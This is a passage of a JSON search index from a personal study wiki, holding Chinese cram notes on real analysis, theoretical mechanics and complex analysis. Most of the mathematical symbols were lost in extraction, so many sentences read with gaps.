单侧导数极限定理: 开区间 可导, 在 右连续, 导函数右极限 存在 右导数 存在. 左端点的情况类似. 推论 开区间可导 导函数在开区间内不存在间断点 定理 导数极限定理: 在 某邻域内连续, 去心邻域内可导, 存在 定理 Darboux 中值: 在闭区间 可导 能取到 和 之间的每一个值 没有要求导函数要连续, 但表明了导函数具有一定程度的连续性 定义 一致可微: 在区间 上可微. 有 类似一致连续, 要求 对所有 有一致的度量. 普通的可微: 定理 闭区间 上可微, 则 一致可微 一元 Taylor 公式 带 Peano 型余项的 Taylor 公式, 在 处有 阶导数 带 Lagrange 型余项的 Taylor 公式, 通过 Lagrange 中值构造余项 带积分型余项的 Taylor 公式, 在 处有 阶导数, 精确 多元偏导数性质 定理 Lagrange 中值: 二元函数在凸区域上可微, 区域中任意两点 连线段上存在点 使得 高维情况类似 定理 二元函数混合偏导数 在一点连续 相等 实际上, 只需要 连续, 存在 存在且 高维情况下, 各元求导次数相同的高阶偏导数连续即相等 多元 Taylor 公式 为凸区域, , Lagrange 余项: 使得 积分型余项: 说明多元 Taylor 公式求高阶偏导数: 用一元的 Taylor 公式整体代换然后展开, 对应系数得到高阶偏导数. 注意保证展开阶数足够. 隐函数求导 定理 一元隐函数存在定理: 二元函数 满足 在 某邻域内偏导数 存在且连续 则 , 使得 在 附近可唯一确定定义在 上的函数 满足 在 上具有连续导数 定理 多元隐函数存在定理: , 元函数 满足 在 某邻域内偏导数 存在且连续 则 , 使得 在 附近可唯一确定定义在 上的函数 满足 在 上具有连续偏导数 若 具有高阶连续偏导数, 则隐函数也具有相应的高阶连续偏导数 多元向量值隐函数定理 二阶, 三阶的情况, 常用算法是 对 求导得 , 解得 , 再对 求导解 General cases: 存在点 使 一阶偏导数存在且连续 则可确定隐函数 , 一阶导数 Jacobi 矩阵 () 满足 逆映射定理"},{"title":"数分速通 - 函数极限","path":"/wiki/calculus/function-limit.html","content":"Heine 定理 定理 含于 内, 以 为极限的数列 , 相应的函数值数列收敛到 定理 存在 含于 内, 以 为极限的数列 , 相应的函数值数列极限 存在 只需说明函数值数列极限一定存在, 可证明其相等. 可推广到左右极限及其他极限过程 函数极限 Cauchy 收敛 定理 存在 有 不用极限值说明极限存在. 可推广到左右极限及其他极限过程 连续函数 定义 在 某邻域内有定义, , 称函数 在 连续. 收敛于 , 定理 反函数连续性定理: 设 在闭区间 上连续且严格单调增加, 记 , 则它的反函数 在 连续且严格单调增加 一致连续 定义 定义在区间 上的函数 , 有 连续一致连续 选取与 无关, 区间内存在统一的度量 连续连续一致连续连续 下凸函数在任意闭区间上 Lipschitz 连续. 证明函数在区间上不一致连续, 利用否定 取一个 , 构造与 有关的 , 代入 并展开, 使其能大于 定理 一致连续 中数列 , , 有 自变量无限接近时, 函数值也要能无限接近. 作用当然是用来证不一致连续 说明一致连续例题通过定义的直接否定 证明不一致连续.通过构造函数值极限不同的点列来证明不一致连续, 常见于涉及三角函数证明证明是一致连续, 可通过放缩找到 Lipschitz 连续的系数 在 一致连续 利用极限相关证明的常见技巧, 闭区间上连续函数的性质 Weierstrass 有界性: 在 上有界 Weierstrass 最值: 在 上能取到最大值和最小值 Bolzano-Cauchy 零点: 若 , 则 Brouwer 不动点: 若 , 则 Bolzano-Cauchy 中间值: 能取到介于最小值和最大值之间的任何一个值 Cantor: 在 一致连续 存在 在 一致连续 简要证明 由 Cauchy 收敛, 在 一致连续, , 要么 , 要么 Cauchy 收敛的形式很像一致连续. 注意定理的逆命题不成立, 如"},{"title":"About","path":"/about/index.html","content":"Hi 👋, I’m duanyll A deep learning learner in China, also interested in electronic design."},{"title":"数分速通 - 定积分","path":"/wiki/calculus/integral.html","content":"Riemann 积分 定义 Riemann 积分: 定义在 上, , 若 的分割 分点 , 只要 , , 就有 则 在 上可积, 和式 称为 Riemann 和, 极限值 为 在 上的定积分 不是严格的极限过程, 注意分割方式和分点选取都是任意的, 通过控制分割区间的最长长度来趋近无限细分 定理 在 有界 定义 Darboux 和: 在 有界, 的分割 为 在 上的振幅, 定义 Darboux 大和和 Darboux 小和: 易知 关于 有下界 (有界函数最小值 区间长度), 有下确界 关于 有上界 (有界函数最大值 区间长度), 有上确界 ; 引理 Darboux: 在 有界, 定理 在 有界, 下列条件等价 定理 定理 在闭区间单调 (也可推广到 ), 对于有界上凸连续函数 (如 ), 有 Newton-Leibniz 公式 定理 Newton-Leibniz: 在 上有原函数 , 若 , 则 定理 在 处连续, 变上限积分 在 处可导, , 端点处指左右导数. 若 , 则 可积 连续, 连续 可导 推论 , 在 可导, 在 可导, Poincare 不等式 定理 , , (或者简单情形, ) 这个不等式说明了一个函数的行为可以用这个函数的变化率的行为和它的定义域的几何性质来控制。也就是说，已知函数的变化率和定义域的情况下，可以对函数的上界作出估计。- Wikipedia 令 , 则 . 分部积分 Cauchy-Schwarz 不等式积分形式: 平方后利用 Cauchy-Schwarz 不等式积分形式 展开 使用 Cauchy-Schwarz 不等式积分形式 两侧对 积分 代入 得到 即 积分中值定理 定理 积分第一中值定理: , 在 上不变号, 使得 若 具有原函数, 则 使得 乘积的积分, 可将其中一项用积分区间内某一点代替. 注意 在闭区间可积, 但是 在开区间中 定理 积分第二中值定理: , 若 在 非负递减, 则 若 在 非负递增, 则 单调区间上, 取较大的端点值, 然后缩减掉较小的部分区间 反常积分 无界区间反常积分 在 有定义, 在任意有限区间 上 Riemann 可积 定义 反常积分: 定义反常积分 即 有 类似可定义 . 规定 定理 收敛 在 有界. 如果能把 积出来就好了, 下面的判别法针对积不出来的情况 定理 比较判别法: 使得 收敛 收敛 发散 发散 大的比小的更发散. 常取 推论 比较判别法的极限形式: 非负, , 则 收敛 收敛 , 则 发散 发散 , 二者敛散性相同 数项级数收敛 通项趋于零 收敛 , 甚至不能保证 存在 一种函数极限不存在的构造 定理 无界区间反常积分的 Cauchy 收敛原理: 收敛 有 和其他 Cauchy 收敛原理一样避开了对极限值的讨论 定理 Abel 判别法: 收敛 在 单调有界 收敛 定理 Dirichlet 判别法: 在 有界 在 单调且 收敛 单调, 有界, 收敛 定义 绝对收敛: 收敛, 若 发散但 本身收敛, 称为条件收敛. 定理 绝对收敛 本身收敛 无界函数的瑕积分 在 有定义, 是 唯一瑕点, 在任意 上 Riemann 可积 定义 瑕积分: 类似可定义以 为瑕点的情况. 定理 瑕积分的 Cauchy 收敛: 收敛 有 瑕积分的比较判别法, Abel 判别法, Dirchlet 判别法, 绝对收敛, 条件收敛类似无界区间反常积分 若区间中包含多个瑕点或无穷端点, 需要拆分后应用各自的定理 含参变量积分 定积分 定理 连续性定理: , 则 在 连续, 即 定积分和极限可交换顺序 定理 积分次序交换定理: , 则 在 Riemann 可积, 且 注意交换时各变量对应的积分上下限 积分下求导定理: , 则 在 可导, 且 定积分和偏导可交换顺序 定理 变上下限求导定理: , 在 上可导, , 则 是 和 的推广 反常积分 定义 设 , 含参变量反常积分 收敛 定义 含参变量反常积分一致收敛: 有 一致体现在 的选取与 无关 类似可定义 和 一致收敛. 设 , 以 为唯一瑕点的瑕积分 收敛 定义 含参变量瑕积分一致收敛: 有 类似可定义以 为瑕点或以 为瑕点的情形. 定义 内闭一致收敛: 关于参数 在开区间 上内闭一致收敛, 即关于参数 在 的任意闭子区间上一致收敛 判别 定理 含参变量反常积分一致收敛 Cauchy 收敛原理: 有 否定: 都可构造为与 有关. 定理 含参变量瑕积分一致收敛 Cauchy 收敛原理: 有 定理 Weierstrass 判别法: 且 收敛 一致收敛 用一个上界把 的变化控制住 定理 Abel 判别法: 关于 在 上一致收敛 对于任意固定的 关于 在 单调, 且一致有界 1 关于 在 一致收敛 定理 Dirichlet 判别法: 在 一致有界 对于任意固定的 关于 在 单调且 一致收敛到零 关于 在 一致收敛 乘积各部分都要求一致收敛, 一致有界. 性质 定理 连续性定理: 设 , 含参变量反常积分 关于 在区间 上一致收敛, 则 在 上连续, 即 证明开区间上连续, 可证明在开区间内的任意闭区间一致收敛 定理 积分次序交换定理: 关于 在区间 上一致收敛, 则 定理 积分次序交换定理, 两个积分限均为无穷: 关于 在 一致收敛 关于 在 一致收敛 或 存在 则有 将积分内两式相减的情况视为对参变量的定积分, 然后交换积分次序 定理 积分下求导定理 收敛 关于 在 一致收敛到 则有 用于计算积分值, 先证明满足条件, 然后对偏导数中的积分形式应用分部积分, 构造微分方程 定理 Dini 定理: 且 不变号 关于 在区间 连续 则有 关于 在区间 一致收敛 连续 不变号 一致收敛 有 ↩︎"},{"title":"数分速通 - 级数","path":"/wiki/calculus/series.html","content":"数项级数 定义 级数收敛: 级数 的部分和数列 的极限 存在且有限 正项级数敛散性判别 定理 正项级数收敛 部分和数列有上界 定理 比较判别法: 正项级数 , , 若 使得 收敛 收敛 发散 发散 定理 积分判别法: 在 非负, 在 Riemann 可积, 取单增趋于 的数列 , 记 正项级数 与反常积分 具有相同的敛散性 收敛时, 推论 单调减少时, 正项级数 与反常积分 具有相同的敛散性 (如 与 ) 定理 Cauchy 判别法: 正项级数 , 记 收敛 发散 推论 d’Alembert 判别法: 正项级数 , 收敛发散 定理 Raabe 判别法: 正项级数 , 记 收敛 发散 分式和结论与 Cauchy 判别法相反, 一层不够可以多层叠加, 也存在无数层也不能判别的情况 一般项级数敛散性判别 定理 数项级数收敛的 Cauchy 收敛原理: 有 引理 Abel 变换: 两数列 , 记 , 则 类似分部积分 引理 Abel: , 单调, 若 使得 , 则 定理 Abel 判别法 收敛 单调有界 则 收敛 定理 Dirichlet 判别法 有界 单调收敛到 则 收敛 单调, 有界, 收敛. 交错级数的 Leibniz 判别法是 Dirichlet 判别法的特殊情况 定理 绝对收敛 原数列收敛 运算律 定理 收敛级数任意添加括号, 仍然收敛, 和不变 定理 加括号后级数收敛, 且每个括号内各项符号相同 原数列收敛 令 定理 绝对收敛 收敛 条件收敛 发散到 定义 更序级数: 将 的项重新排列得到 定理 绝对收敛 绝对收敛且 定理 Riemann: 条件收敛 更序级数 收敛到 定义 Cauchy 乘积: 为 和 的 Cauchy 乘积, 记为 定理 Cauchy 定理: 和 绝对收敛到 和 , 则 按任意方式相加所得级数绝对收敛到 函数项级数 函数列一致收敛 定义 函数列一致收敛: 与 定义在区间 上 有 在区间 上一致收敛到 定理 在区间 上一致收敛到 距离 通过单调性等找到上界, 消除 , 将函数列收敛转化为数列收敛 定理 函数列一致收敛的 Cauchy 收敛原理: 在区间 上一致收敛到 有 定理 逐项积分定理: 在区间 上一致收敛到 , 且 积分和极限可交换顺序 事实上, 由 Arzela 控制收敛定理, 无需要求一致收敛, 只需满足收敛和一致有界, 结论就能成立 定理 连续性定理: 在区间 上一致收敛到 , , 即 有 定理 逐项求导定理: 在区间 上逐点收敛 在区间 上一致收敛到 且 在区间 上一致收敛到 , , 中数列 收敛到 定义连续 定理 Dini 定理: 单调收敛于 在区间 上一致收敛到 函数项级数一致收敛 定义 函数项级数一致收敛: 函数项级数 部分和函数列 在 上一致收敛到 , 称函数项级数 在 一致收敛到 定理 函数项级数 一致收敛 一致收敛到 Cauchy 收敛原理, Weierstrass 判别法, Abel 判别法, Dirichlet 判别法类似含参变量反常积分. 和函数分析性质 定理 逐项积分定理: , 函数项级数 在 一致收敛到 且 定理 连续性定理: , 函数项级数 在 一致收敛到 , 即 定理 逐项求导定理: 在 逐点收敛 到 在 一致收敛到 且 幂级数 幂级数和函数性质 定理 Abel 第一定理 在 处收敛 时绝对收敛 在 处发散 时发散 定理 Cauchy-Hadamard 公式: 任意幂级数 , 记 则收敛半径 更简单的情况也可行, 定理 Abel 第二定理: 收敛半径为 , 在 内闭一致收敛1 在 收敛 上一致收敛 在 收敛 上一致收敛 在 收敛 一致收敛 定理 逐项积分定理: 收敛半径为 , 和函数在 可积 (若在端点处收敛也成立) 上式右端幂级数收敛半径也为 定理 连续性定理: 收敛半径为 , 和函数在 连续 (若在端点处收敛也成立) 定理 逐项求导定理: 收敛半径为 , 和函数在 可导 (若在端点处收敛也成立) 上式右端幂级数收敛半径也为 定理 Tauber 定理 收敛半径为 存在 Taylor 级数 定理 在 任意阶可导, 使得 , 则 定理 在 任意阶可导, 各阶导数非负, 有 定理 Weierstrass 第一逼近定理: 多项式 使得 在开区间内任意闭区间内一致收敛↩︎"},{"title":"理论力学速通 - 分析力学","path":"/wiki/clamacha/analytics.html","content":"约束与广义坐标 约束: 限制物体的位置或运动的条件. 约束可以 限制位置: 物体位置满足函数关系 限制速度: 物体速度满足函数关系 概念 解释 例子 稳定约束 约束方程与时间无关 物体在地面上 不稳定约束 约束方程与时间有关 纯滚动 可解约束 约束方程为等式 不可解约束 约束方程为不等式 几何约束 约束方程只含有坐标 运动约束(微分约束) 约束方程含有坐标的一次导数(速度) 纯滚动 完整约束 能通过变换化为等式的几何约束 积分等变换 广义坐标: 描写系统位形所用的独立坐标, 如电场极化, 气体体积等均可作为广义坐标. 广义坐标的个数即为系统自由度数. 将质点的位移表示为广义坐标的函数 习惯地, 为系统的自由度数, 枚举 的下标; 为质点个数, 枚举 的下标. 使用 Einstein 求和约定. 由 个质点构成的系统最多有 个自由度. 速度 对于稳定约束, 约束方程与时间无关, 有 并且 虚功原理 平衡时, 考虑一个所有约束条件允许的微小位移, 称为虚位移. 对于稳定约束, 实位移一定是虚位移之一. 而对于不稳定约束, 实位移可能不是可能的虚位移. 将力在虚位移中做的功称为虚功. 若在任意虚位移中, 约束力 的虚功都为零, 则称为理想约束. 光滑约束一般是理想约束 对于多个物体的受力和多个广义坐标的情况, 总的虚功 则记 为对应于广义坐标 的广义力, 虚功可写作 平衡时, 有 对于理想约束, 由 知 即 由于广义坐标之间相互独立, 虚功原理: 对理想约束, 平衡时, 广义力必为零. 使用虚功原理求解平衡条件 确定系统的自由度数 选取作为广义坐标的变量 按定义 写出广义力 应该是常量或者 的函数 可先写出 与 的方程, 再隐函数求导 设法求解方程组 , 解出 虚功原理只是提供了列出方程的方法, 求解方程仍然需要数学技巧 Euler-Lagrange 方程 对于不处于平衡状态的体系, 从牛顿第二定律出发可得到 D’Alembert 原理: 乘以虚位移 理想约束下 左边可写成广义力的形式 稳定约束下, 右边也表示为广义坐标的形式 类似分部积分 质点的动能 则有 和 代入 中 利用广义坐标的独立性得到 Euler-Lagrange 方程 若主动力都是保守力, 令系统势能 , 则 并且有 替换到 式右侧 移项 令系统的 Lagrange 函数 则得到保守力系下的 Lagrange 方程 Lagrange 方程与牛顿第二定律等价. 通过 Lagrange 函数可以导出运动微分方程. 使用 Lagrange 方程求解问题的方法 确定系统的自由度数. 选取广义坐标变量. 根据 写出 Lagrange 函数. 应当是关于 变量的函数. 根据 得到运动微分方程. 求解偏导数时, 认为 都是相互独立的变量. 可能可以通过运动微分方程求解 关于 的函数, 也可以根据方程的形式来分析运动的性质. 循环积分 定义广义速度为 , 广义动量 将 Lagrange 方程中不显含的坐标称为循环坐标, Lagrange 方程对循环坐标积分称为循环积分. 由循环积分得到广义动量守恒: 若 Lagrange 函数显含某个广义坐标, 则对于的广义动量守恒. 能量积分 对于完整稳定的约束体系, 由 有 则 则动能是广义速度的二次齐次函数1满足 对时间求导 Lagrange 方程 两边同乘 并对 求和 拆开函数完整稳定约束 则知此时 为常数 对于完整稳定约束, 且主动力都是保守力时, Lagrange 通过能量积分给出能量守恒 Lagrange 函数性质 对称性 守恒 不显含时间 时间平移对称 能量守恒 不显含线坐标 空间平移对称 动量守恒 不显含角坐标 空间选择对称 角动量守恒 Hamilton 正则方程 希望能获得 Lagrange 方程的一阶形式以方便计算. 通过 Legendre 变换定义 Hamilton 函数 左侧按多元函数链式法则求微分 右侧求微分 对照得 得到与 Lagrange 方程等价的 Hamilton 正则方程: 时间平移对称与能量守恒: 当 不显含时间时, 是系统总能量, 系统能量守恒 空间均匀与广义动量守恒: 若 不显含某个广义坐标, 则对应的广义动量守恒 用 Hamilton 正则方程推导运动微分方程 确定系统自由度数 选择广义坐标 写出 Lagrange 函数 求广义动量 写出 Hamilton 函数 求正则方程 次齐次函数 ↩︎"},{"title":"理论力学速通 - 质点系力学","path":"/wiki/clamacha/mass-point-system.html","content":"内力和外力 内力总冲量为零 内力总力矩为零 内力总功不一定为零 成对内力的总共为力与相对位移的乘积 质心 质心 动量 质心运动定理: 质心的运动相当于外力集中在质量等于总质量的质点的运动 外 质点系动量定理: 作用在质点系上的所有外力的冲量等于质点系动量的增量 质点系动量守恒 质点系动量分量守恒 碰撞, 爆炸过程是否满足动量守恒 重力等外力是否有界 角动量 质点系角动量定理: 对于惯性运动的参考点, 作用在质点系上所有外力的总力矩等于质点组的总角动量随时间的变化率 对质心的角动量定理: 作用在质点系上所有外力对质心的总力矩等于质点组对质心的总角动量随时间的变化率。 质点系的总角动量: 质点系相对任意点的角动量 质点系的总角动量等于质量集中在质心的质点的角动量加上质点系相对于质心的角动量之和 角动量守恒 对于惯性运的的参考点, 所有外力总力矩为零, 总角动量守恒 所有外力对质心总力矩为零, 对质心的总角动量守恒 对于非惯性运动的参考系, 应当考虑 真实力矩惯性力矩 而对于质心参考系 (原点随质心), 即使质心非惯性运动, 惯性力矩也为零, 角动量定理成立 动能 质点系动能定理: 外力和内力的总功等于质点系总动能的增量 质点系机械能守恒: 非保守内力不做功, 外力不做功, 则机械能守恒 相对于质心的动能: 柯尼西定理 相对于质心动能定理: 所有内力和外力相对于质心系做功之和等于相对于质心系总动能的增量 两体问题 相对于质心的运动: 在质心系中始终满足牛顿定律 相对于另一质点的运动: 折合质量 质点的相对运动等价于一个具有折合质量的质点在相同的力下的运动 变质量物体的运动 不适用牛顿定律, 不适合在质心系中分析 惯性系中变质量物品的速度 惯性系中质量增量的速度 质量变化率 除质量变化造成的反冲之外, 受到的其他外力 (重力等)"},{"title":"理论力学速通 - 质点力学","path":"/wiki/clamacha/mass-point.html","content":"坐标系 直角坐标 自然坐标 曲率半径: 自然坐标下 适合计算摩擦力 极坐标 位矢 速度 加速度 径向速度改变向心加速度角速度改变科里奥利力 柱坐标系 在极坐标的基础上加了一维直角的 z 轴 球坐标系 复杂, 很少使用 三维自然坐标 少见 功和能 动能 功 功率 保守力三种定义 力做的功只与初末位置有关, 与经过的路径无关 延任意闭合路径做功为零 旋度恒为零 保守力做总共等于系统势能减小 力与势能的关系 动能定理 质点在 轴上运动, 所受合力是保守力, 在势能极小点附近的震动的简谐振动 简谐振动的平均动能等于平均势能 角动量 质点相对定点的角动量: 质点相对定点的力矩: 角动量定理: 角动量守恒定律: 守恒 有心力 有心力作用下质点必做平面运动 有心力是保守力, 机械能守恒 有心力力矩为零, 角动量守恒 极坐标下运动微分方程 与守恒方程等价 解方程得到 积分可得到极坐标系下运动轨迹 . 代入万有引力势 积分得到 圆锥曲线离心率 比奈公式, 令 可用来解运动轨迹"},{"title":"理论力学速通 - 刚体力学","path":"/wiki/clamacha/rigid-body.html","content":"刚体: 没有形变的物体 物体中任意两点距离永不改变 计算能力, 动量, 角动量不考虑内力, 一切内力可忽略 自由度: 3 平动 + 3 转动 刚体上二力平衡: 等大反向共线 滑移矢量: 刚体上的力可沿力线任意滑动 若要把刚体上的力移到任意点, 需要加上新的力偶, 力偶矩等于移动前的力对指定点的力矩 力偶: 一对等大, 反向, 不共线的力, 不影响平动 力偶对以任意点为参考点, 力偶矩均为 相 刚体上的力可以沿任意点简化 主矢: 主矩: 刚体平衡条件: 主矢主矩均为零 汇交力系: 若所有力过同一点, 则主矩为零, 只用计算主矢 平面力系: 在 平面上, 则只用求 三力平衡: 要么三力共点, 要么平行 以下条件等价 三力能被一力代替 存在一点主矩为零 任意一点主矢垂直于主矩 刚体平衡问题可能是超静定问题 (未知数多于方程数), 此时无唯一解, 刚体模型不适用, 必须考虑物体的形变 刚体的运动 平动 定轴转动 定点转动 平面平行运动 (滚动): 任意一点始终在平行于固定平面的平面内转动 一般运动 转动的描述 角位移: 大小为绕轴转过的角度, 方向与转过角度成右手关系 原点在轴上 不满足平行四边形法则, 不是矢量 无限小角位移是矢量 角速度矢量 原点在轴上 对所有参考点, 角速度都是相同的 角加速度矢量 对所有参考点, 角加速度都是相同的 欧拉角 按顺序, 依次旋转: 进动角 : 绕 轴, 轴转向 轴 章动角 : 绕 轴, 轴转向 轴 自转角 : 绕 轴, 轴转向 轴 动系中 静系中 定点转动 绕质心转动方程 绕固定轴的转动惯量 (考虑每个点到轴的距离) 欧拉角 希望能计算绕任意固定轴 (方向角 ) 的转动惯量 存在一个方向, 可以相似对角化惯量张量 xOy 平面对称, 绕 x 轴中心对称 角动量 转动动能 静系下定点转动动力学方程 欧拉动力学方程 (动系中) 定轴转动 绕 z 轴转动, 角动量定理 平面物体对于面上任意一点, 惯量张量都具有如下形式 垂直轴定理: xOy 平面上的平面物体绕 z 轴的转动惯量等于绕 x 和 y 轴的转动惯量之和. 平面平行运动 刚体上任意点的速度: 基点的速度与相对基点的转动速度的矢量和 这个公式中, 基点的选取可以是任意的 刚体上任意点加速度: 基点加速度和相对于基点转动加速度的矢量和 转动瞬心: 某一时刻平面上的某一点的速度为零 刚体上任选两点，若它们的速度方向不平行，则通过两点作速度的垂线，交点即为转动瞬心 如果两点的速度的垂线相互平行，且不重合，则可以认为它们的点在无限远处，即无限远处为瞬心。此时刚体作平动 如果两点的速度的垂线重合，且大小相等，方向相同，则无限远为瞬心。此时刚体作平动 如果两点的速度的垂线重合，且大小不等，此时作两速度矢量的末端的连线，它与垂线的交点即为瞬心 若刚体上三个质点的速度恒相同, 则刚体只能做平动"},{"title":"复变函数速通 - 解析函数","path":"/wiki/complex/analytic-function.html","content":"复数 定义复数 , , 共轭 模长 三角不等式 辐角 任何一个非零复数都有无穷个辐角 辐角主值: 在复数的辐角中把满足 称为 的主值 三角表示法 指数表示法 求用复数方程表示的曲线: 代入 , 再通过平方, 取模等方法消除 , 得到关于 的方程. 最好先从几何意义上解释曲线. 定理 两复数相乘, 模长相乘, 辐角相加. 定理 两复数相除, 模数相除, 辐角相减. 有 但不一定有 , De Moivre 公式: 模长为 时有 复平面上的点集 关于复平面点集的基本概念 邻域: 内部的点的集合称为 的邻域 无穷远点的邻域: 去心邻域: 无穷远点的去心邻域: 内点: 为 中一点, 存在 的邻域, 邻域内所有点都属于 开集: 中每一点都是内点 区域: 联通的开集 边界点: 不属于区域 的点 , 在 的任意小邻域中总有 中的点 边界: 的所有边界点的集合, 记为 边界可能是由几条曲线和孤立的点组成 闭区域: 区域连同边界 有界区域 / 无界区域: 是否可包含在以原点为中心的圆内 连续曲线: , 是连续的实变函数 光滑曲线: 连续且 简单曲线 / Jordan 曲线: 没有重点的连续曲线 简单曲线自身不相交 任意一条简单闭曲线将复平面唯一分成三个互不相交的点集 内部: 有界区域 外部: 无界区域 边界: 内部和外部的公共边界 单连通域: 在区域内任作一条简单闭曲线, 曲线内部总属于区域 (没有洞) 多连通域: 不是单连通域的区域 简单闭曲线的方向: 正向对应内部在左侧 (外边界逆时针, 内边界顺时针) 连续和极限 复变函数不区分函数, 映射, 变换等概念, 一个自变量对应的因变量可能不是唯一的. 定理 的方式是任意的. 许多实数列极限相关的定理对复数列极限仍成立, 如 Bolzano-Weierstrass 聚点定理, 闭集套定理, Heine-Borel 有限覆盖定理等. 定理 连续 和 都连续 许多闭区间上连续函数的性质可推广到有界闭集上的连续复变函数, 如 Weierstrass 有界性和最值定理 (模长意义下), Cantor 一致连续性等等. 包括无穷远点在内的复平面称为扩充复平面. 可讨论广义极限和广义连续. 解析函数 定义 复变函数的导数: , 定义域区域 , 不超过定义域范围, 的方式是任意的. 定义 在区域内处处可导, 则称 在区域内可导 同实变函数, 可导一定连续, 连续不一定可导. 对于以复数 的运算表示的复变函数, 求导规则同实变函数. 对于拆分实部虚部表示的复变函数, 可导性不显然. 定理 在 可导 在 可微 定义 在 解析: 在 及其邻域内处处可导 定义 在区域 内解析 / 解析函数 / 全纯函数 / 正则函数: 在区域 内每一点解析 定义 奇点: 在 不解析, 但在 任意邻域内总有 的解析点 函数在区域内解析 函数在区域内可导 函数在一点解析 函数在一点可导 解析函数的和差积商 (除去分母为零的点) 解析 解析函数的复合函数解析 所有多项式在复平面处处解析 有理分式函数子在分母不为零的点解析, 分母为零的点是奇点 Cauchy-Riemann 方程 定理 在一点可微 在该点可微, 且满足 Cauchy-Riemann 方程 此时有导数公式 以及其他根据 C-R 方程导出的代换形式. 另外可结合二元实变函数可微的必要条件和充分条件: 可微 存在, 满足 C-R 方程 可微 连续, 满足 C-R 方程 由复变函数可微和可导的等价性, 在区域 上, 解析 在区域内可微, 且满足 C-R 方程. 事实上, 由解析函数的无穷可微性, 可微 连续, 满足 C-R 方程 极坐标的 C-R 方程 说明 在区域 内解析, 以下条件彼此等价 是常数函数 是常数函数 解析 是常数函数 是常数函数 是常数函数 初等解析函数 指数函数 定义满足以下条件的 为指数函数 在复平面内处处解析 时, 有 记作 也写作 , 但没有幂的意义 加法定理 可得到 的周期性, 周期是 这是实变函数 不具有的性质 三角函数 定义 正弦, 余弦函数的奇偶性, 周期 (), 导数, 三角恒等变换公式等同实变函数, 但是不再具有有界性. 类似可定义正切, 余切, 正割, 余割等三角函数. 双曲函数 是以 为周期的周期函数, 导数和三角变换公式同实变函数. 有 初等多值函数 定义 单叶函数: 在区域 内有定义, 且对于 内任意不同两点 有 . 从区域 到 区域 的单叶满变换是从 到 的一一变换. 希望把多值函数的函数值限制到单叶函数, 以便研究, 可以使用 限制辐角法 割破平面法 根式函数 定义 次根式函数: , 记为 , 是幂函数 的反函数. 的根是以原点为中心, 为半径的圆内接正 边形的 个顶点 根式函数的多值性: 时, 多值性的成因 终边 相同时, 的旋转角度可以多 将 分为单值解析分支后, 可求导数 限制辐角法 将 平面分割成 个区域 n=3的情形 这样 平面上每个角形区域能恰好映射到整个 平面上. 区域 是单叶性区域 , 满足下列条件的 对应的角形互不相交且填满 : 然后可限制只取原函数落在某个特定单叶性区域的值, 即可将原函数转化为单叶函数. 式 给出了根式函数的单值解析分支. 限制辐角法只能处理 平面能被简单按辐角划分的情况. 割破平面法 根式函数出现多值性的原因是 的辐角不能唯一确定, 可能相差 . 考虑在原点到 任意引一条割线 (或者无界简单曲线). 割破的 平面构成一个以割线为边界的区域 , 在 内指定一点 和它的辐角值, 则 内任意点 的辐角都可以根据 的辐角连续变化而唯一确定. 考虑变点 从 出发, 沿 内任一条过 的简单闭曲线前进一周, 在 平面上的像点也画出一条闭曲线, 则 能回到起始值 , 式 给出 的 个单值连续分支函数. z 平面上和 w 平面上闭曲线 定义 多值函数的支点: 变点 绕这点一整周时, 多值函数从一支变换到另一支. 即变点转回原来的位置时, 函数值和原来的值相异. 有且仅有支点 若定义域不包括原点, 则不需要割破平面也能划分单值解析分支. 定义 支割线: 用来割破 平面从而得到单值解析分支的割线. 支割线具有两岸, 上岸, 下岸, 左岸, 右岸 对于支割线的不同做法, 得到的分支不同, 各分支的定义域随支割线变化. 每个单值分支在支割线上是不连续的, 在两岸取到不同的值, 可以扩充到单边连续到一岸. 定义 主值支: 取负实轴为支割线, 其中有一支在正实轴上取正实值 对数函数 定义 对数函数是指数函数 的反函数, 记为 是 的无穷多值函数. 主值支: 负数无实对数, 正实数的复对数也是无穷多值的, 复对数仍然满足对数函数的基本性质 (集合相等) 对数函数的单叶性区域是带状 导数是单值的 的支点是 一般幂函数, 一般指数函数 定义 一般幂函数: 为复变数, 为复常数, 定义一般幂函数 为整数. 是单值函数 为有理数 , 能取 个不同的值 为无理数或虚数, 无穷多值 定义 一般指数函数: 具有有限个支点的函数 是任意的 次多项式 可能的支点是 和 不能整除 是支点 不能整除 是支点 能整除 中若干个之和, 则对应的几个可以连接成割线抱成团, 变点在抱团内部简单闭曲线转一整周后函数值不变. 抱团可以不止一个, 不能抱团的点 和 连接成割线. 说明由单值解析分支上一点的初值 计算另一点的终值 : 先计算沿曲线不通过支割线到达终点的辐角连续改变量 , 再计算终值还是要看例题才明白 反三角函数"},{"title":"复变函数速通 - 积分","path":"/wiki/complex/integral.html","content":"简单闭曲线的方向: 正向对应内部在左侧 (外边界逆时针, 内边界顺时针). 复定积分的定义类似实数域上的 Riemann 定积分, 只是不在区间上, 而是在光滑的有向曲线上划分分点. 对积分路径的划分 定理 可积的条件: 连续, 光滑 可积 在形式上可以视作 与 相乘 分实部, 虚部转化为两个二元实变函数的线积分 复积分仍具有实积分的线性性, 可加性等性质, 注意积分估值不等式 若 有上界 : 说明绕奇点的圆周上的积分 Cauchy 积分定理 定理 在单连通域 内处处解析, 则 沿 内任意一条封闭曲线 的积分为零. 若 连续, 则利用 Green 公式和 C-R 方程容易说明. 在不连续时也成立. 另有推论 若 是 的边界, 易得只需在闭区域 上解析就有结论成立 事实上, 只需要在 内解析, 在 上连续就有结论成立 闭路变形原理 定理 闭路变形原理: 解析函数沿闭曲线的解纷, 不因闭曲线在区域内连续变形 (不经过不解析点) 而改变. 复合闭路定理 定理 复合闭路定理: 在 内解析, 各自绕一个奇点 沿外边界积分等于沿内边界积分之和 是由 正向, 反向组成的复合曲线 可将 的结论推广到绕奇点的任意简单闭曲线上. 不定积分 定理 在单连通域 内处处解析, 积分 与路径无关 定理 变上限求导: 在单连通域 内处处解析, 是 内解析函数, 定义 原函数: 在 内导数为 , 称 是 的原函数. 的任意两个原函数相差一个常数. 有类似实数的 Newton-Lebiniz 公式. Cauchy 积分公式 定理 在区域 内处处解析, 为 内任意一条正向简单闭曲线且内部完全包含于 内, 为 内任意点, 则 解析函数在区域内的值可用边界上的积分来表示. 公式也提供了计算解析函数积分的方法. 定理 解析函数的平均值定理: 解析函数在圆心处的值等于在圆周上的平均值. 定理 解析函数的无穷可微性: 解析函数的导数仍然是解析函数. 解析函数的 阶导数: 通过高阶导数公式, 利用求导来计算积分 定理 Morera 定理: 在单连通区域 内连续, 且对于区域内任意周线 在区域内解析 Cauchy 不等式 定理 在 内解析, 圆周 及其内部包含于 , 则 